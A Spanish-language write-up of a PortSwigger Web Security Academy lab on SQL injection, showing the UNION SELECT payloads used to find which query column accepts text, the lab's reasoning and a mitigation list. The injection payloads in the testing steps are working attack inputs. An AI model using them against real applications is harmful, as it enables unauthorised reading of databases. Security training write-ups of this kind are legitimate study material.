# SQL Injection UNION Attack – Encontrar una columna compatible con texto

## 🧪 Laboratorio

PortSwigger Web Security Academy – SQL Injection

**Laboratorio:** SQL injection UNION attack, finding a column containing text

**Categoría:** SQL Injection

**Dificultad:** Practitioner

---

## 🎯 Objetivo

La aplicación contiene una vulnerabilidad de SQL Injection en el filtro de categoría de productos.

El objetivo del laboratorio es utilizar un ataque `UNION SELECT` para determinar **qué columna de la consulta original es compatible con datos de tipo texto**.

El laboratorio proporciona un valor aleatorio que debe aparecer dentro de los resultados de la consulta.

---

## 🔎 1. Determinar el número de columnas

En el laboratorio anterior se determinó que la consulta original devuelve:

```text
3 columnas
```

Por lo tanto, el `UNION SELECT` utilizado en este laboratorio debe contener también tres columnas.

---

## 🧪 2. Probar la primera columna

Se comenzó colocando el valor proporcionado por el laboratorio en la primera columna:

```text
'+UNION+SELECT+'MvCXlG',NULL,NULL--
```

La aplicación no permitió utilizar esta posición para el valor de texto.

---

## 🧪 3. Probar la segunda columna

A continuación, se colocó el valor en la segunda columna:

```text
'+UNION+SELECT+NULL,'MvCXlG',NULL--
```

Esta consulta fue aceptada por la aplicación y el valor:

```text
MvCXlG
```

apareció dentro de los resultados.

El laboratorio fue marcado como **Solved**.

---

## ✅ Resultado

El payload exitoso fue:

```text
category='UNION+SELECT+NULL,'MvCXlG',NULL--
```

Esto permitió determinar que la **segunda columna es compatible con datos de tipo texto**.

La estructura identificada es:

| Columna | Compatible con texto |
|---|---|
| 1 | ❌ |
| 2 | ✅ |
| 3 | ❌ / no necesario comprobar |

---

## 🧠 ¿Por qué es importante?

En un ataque basado en `UNION SELECT`, no solamente necesitamos conocer el número de columnas.

También necesitamos saber **qué columnas aceptan el tipo de dato que queremos recuperar**.

Por ejemplo, si queremos obtener:

```text
nombre de tabla
nombre de usuario
versión de la base de datos
```

normalmente necesitaremos colocar esos valores en una columna compatible con texto.

En este laboratorio utilizamos un valor conocido proporcionado por la aplicación y lo fuimos colocando en distintas posiciones hasta encontrar una columna compatible.

---

## 📊 Secuencia de pruebas

La consulta tiene tres columnas:

```text
Columna 1 | Columna 2 | Columna 3
```

Se probó el valor en diferentes posiciones:

```text
'MvCXlG' | NULL      | NULL
NULL     | 'MvCXlG'  | NULL
NULL     | NULL      | 'MvCXlG'
```

La segunda posición fue la que permitió que el valor apareciera correctamente en la respuesta.

---

## 🛡️ Mitigación

La vulnerabilidad de SQL Injection puede prevenirse evitando que los datos proporcionados por el usuario sean incorporados directamente en las consultas SQL.

Las principales medidas de protección son:

- Utilizar consultas parametrizadas (*prepared statements*).
- No concatenar datos controlados por el usuario directamente en consultas SQL.
- Implementar una validación adecuada de las entradas.
- Utilizar cuentas de base de datos con los privilegios mínimos necesarios.
- Evitar mostrar errores detallados de la base de datos.
- Realizar pruebas de seguridad periódicas sobre las aplicaciones.

---

## 📚 Referencias

- PortSwigger Web Security Academy – SQL Injection
